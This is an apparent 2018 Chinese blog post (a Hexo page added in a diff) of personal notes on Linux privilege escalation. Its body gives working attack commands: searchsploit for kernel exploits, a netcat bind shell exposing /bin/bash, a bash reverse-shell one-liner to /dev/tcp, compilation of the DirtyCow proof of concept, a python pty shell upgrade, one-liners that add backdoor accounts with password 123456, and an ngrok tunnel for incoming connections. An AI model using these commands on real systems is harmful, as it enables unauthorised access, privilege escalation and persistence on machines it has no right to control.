@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透,黑阔,提权,Linux,笔记," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文">
+<meta name="keywords" content="渗透,黑阔,提权,Linux,笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权思路">
+<meta property="og:url" content="http://yoursite.com/2018/09/07/Linux提权思路/index.html">
+<meta property="og:site_name" content="Mugen">
+<meta property="og:description" content="前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/4.jpg">
+<meta property="og:updated_time" content="2018-09-07T14:16:05.472Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux提权思路">
+<meta name="twitter:description" content="前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/07/Linux提权思路/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/09/07/Linux提权思路/"/>
+
+
+
+
+
+  <title>Linux提权思路 | Mugen</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mugen</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">lego's blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/07/Linux提权思路/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lego">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mugen">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux提权思路</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-07T12:22:33+08:00">
+                2018-09-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先关于Linux提权我们得先明白几个概念。</p>
+<p>linux发行版本</p>
+<p>是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：</p>
+<ul>
+<li>CentOS</li>
+<li>redhat</li>
+<li>ubuntu</li>
+<li>kali</li>
+</ul>
+<p>linux内核</p>
+<p>Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文件系统控制及多任务功能的系统核心程序。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">linux内核版本的分类</span><br><span class="line"></span><br><span class="line">Linux内核版本有两种：稳定版和开发版 ，Linux内核版本号由3组数字组成：第一个组数字.第二组数字.第三组数字</span><br><span class="line"></span><br><span class="line">第一个组数字：目前发布的内核主版本。</span><br><span class="line"></span><br><span class="line">第二个组数字：偶数表示稳定版本；奇数表示开发中版本。</span><br><span class="line"></span><br><span class="line">第三个组数字：错误修补的次数。</span><br></pre></td></tr></table></figure>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>说到内核提权就得提到脏牛了，这里先放一放，讲讲常规思路。</p>
+<p>查看发行版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure>
+<p>查看内核版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">root@kali:~# uname -a</span><br><span class="line">Linux kali 4.9.0-kali3-amd64 #1 SMP Debian 4.9.18-1kali1 (2017-04-04) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+<p>这样我们就得到了系统的内核版本</p>
+<p>可以用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux Debian 4</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/07/Linux提权思路/1.png" alt=""></p>
+<p>我们可以添加系统信息缩小范围</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果手里只有webshell可以利用反弹shell来得到一个shell</p>
+<p>首先我们得有一个<strong>netcat</strong></p>
+<h4 id="开启本地监听"><a href="#开启本地监听" class="headerlink" title="开启本地监听"></a>开启本地监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 开启本地8080端口监听，并将本地的bash发布出去。</span><br><span class="line">nc -lvvp 8080 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+<h4 id="直接连接目标主机"><a href="#直接连接目标主机" class="headerlink" title="直接连接目标主机"></a>直接连接目标主机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.1 8000</span><br></pre></td></tr></table></figure>
+<h3 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a>bash直接反弹</h3><p>bash一句话shell反弹：个人感觉最好用的用的方法就是使用的方法就是使用bash结合重定向方法的一句话，具体命令如下。</p>
+<p>（1） bash反弹一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>（2）bash一句话命令详解</p>
+<p>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。</p>
+<p><img src="/2018/09/07/Linux提权思路/2.png" alt=""></p>
+<p>其实以上bash反弹一句完整的解读过程就是：</p>
+<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
+<p>具体各种反弹shell方式可参照安全客linux各种一句话反弹shell总结<a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>参考链接：<a href="https://blog.csdn.net/DarkHQ/article/details/79222879" target="_blank" rel="noopener">https://blog.csdn.net/DarkHQ/article/details/79222879</a></p>
+<p>POC:<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a> </p>
+<p>利用gcc编译dirty.c文件 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+<p>反弹shell</p>
+<h4 id="python-一句话获取标准shell"><a href="#python-一句话获取标准shell" class="headerlink" title="python 一句话获取标准shell"></a>python 一句话获取标准shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
+<p>命令详解：python 默认就包含有一个pty的标准库 </p>
+<p><img src="/2018/09/07/Linux提权思路/3.jpg" alt=""></p>
+<h4 id="linux-一句话添加账号"><a href="#linux-一句话添加账号" class="headerlink" title="linux 一句话添加账号"></a>linux 一句话添加账号</h4><p>（1）chpasswd 方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd guest;echo &apos;guest:123456&apos;|chpasswd</span><br></pre></td></tr></table></figure>
+<p>（2）useradd -p 方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd -p `openssl passwd 123456` guest</span><br></pre></td></tr></table></figure>
+<p>（3）echo -e 方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd test;echo -e &quot;123456n123456n&quot; |passwd test</span><br></pre></td></tr></table></figure>
+<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>没有外网IP的我只能搞内网映射了</p>
+<p>参考链接<a href="http://tieba.baidu.com/p/4604965053" target="_blank" rel="noopener">http://tieba.baidu.com/p/4604965053</a></p>
+<p>官网地址<a href="http://jump.bdimg.com/safecheck/index?url=rN3wPs8te/pktEte740r9w9a27/wUy8S3VrZdB8km6k6vG3t8cI+RGASMaqvcy1ms7HAOSGpifMAgXZv4m40jTDeByWQjyiepX12iMtIsEd5z8Bn4gXBxDA8Zu4mdgY0" target="_blank" rel="noopener">https://ngrok.com/</a> </p>
+<p>注册一个账号设置好</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok tcp 9999</span><br></pre></td></tr></table></figure>
+<p>获得一个公网地址</p>
+<p><img src="/2018/09/07/Linux提权思路/4.jpg" alt=""></p>
+<h4 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h4><p>语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;]</span><br></pre></td></tr></table></figure>
+<p>选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-A 　将所有的视窗都调整为目前终端机的大小。</span><br><span class="line">-d &lt;作业名称&gt; 　将指定的screen作业离线。</span><br><span class="line">-h &lt;行数&gt; 　指定视窗的缓冲区行数。</span><br><span class="line">-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。</span><br><span class="line">-r &lt;作业名称&gt; 　恢复离线的screen作业。</span><br><span class="line">-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</span><br><span class="line">-s 　指定建立新视窗时，所要执行的shell。</span><br><span class="line">-S &lt;作业名称&gt; 　指定screen作业的名称。</span><br><span class="line">-v 　显示版本信息。</span><br><span class="line">-x 　恢复之前离线的screen作业。</span><br><span class="line">-ls或--list 　显示目前所有的screen作业。</span><br><span class="line">-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</span><br></pre></td></tr></table></figure>
+<p>常用screen参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br></pre></td></tr></table></figure>
+<p>案例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#创建名称为 ssh的回话</span><br><span class="line">screen -s lego</span><br><span class="line"></span><br><span class="line">#连接ngrok</span><br><span class="line">./ngrok tcp 9999 </span><br><span class="line"></span><br><span class="line">#退出到命令行</span><br><span class="line">ctl+A+D</span><br><span class="line"></span><br><span class="line">#查看回话</span><br><span class="line">screen -ls</span><br><span class="line"></span><br><span class="line">#登录到我刚刚创建的ssh</span><br><span class="line">screen -r lego</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+            <a href="/tags/黑阔/" rel="tag"># 黑阔</a>
+          
+            <a href="/tags/提权/" rel="tag"># 提权</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/04/机器人技术基础/" rel="next" title="机器人技术基础">
+                <i class="fa fa-chevron-left"></i> 机器人技术基础
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://raw.githubusercontent.com/legoc/legoc.github.io/master/about/index/baye.png"
+                alt="lego" />
+            
+              <p class="site-author-name" itemprop="name">lego</p>
+              <p class="site-description motion-element" itemprop="description">从小菜鸡往大菜鸡成长的路上...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内核漏洞提权"><span class="nav-number">2.1.</span> <span class="nav-text">内核漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">2.2.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#开启本地监听"><span class="nav-number">2.2.1.</span> <span class="nav-text">开启本地监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#直接连接目标主机"><span class="nav-number">2.2.2.</span> <span class="nav-text">直接连接目标主机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bash直接反弹"><span class="nav-number">2.3.</span> <span class="nav-text">bash直接反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脏牛提权"><span class="nav-number">2.4.</span> <span class="nav-text">脏牛提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python-一句话获取标准shell"><span class="nav-number">2.4.1.</span> <span class="nav-text">python 一句话获取标准shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-一句话添加账号"><span class="nav-number">2.4.2.</span> <span class="nav-text">linux 一句话添加账号</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网穿透"><span class="nav-number">2.5.</span> <span class="nav-text">内网穿透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#screen命令"><span class="nav-number">2.5.1.</span> <span class="nav-text">screen命令</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lego</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
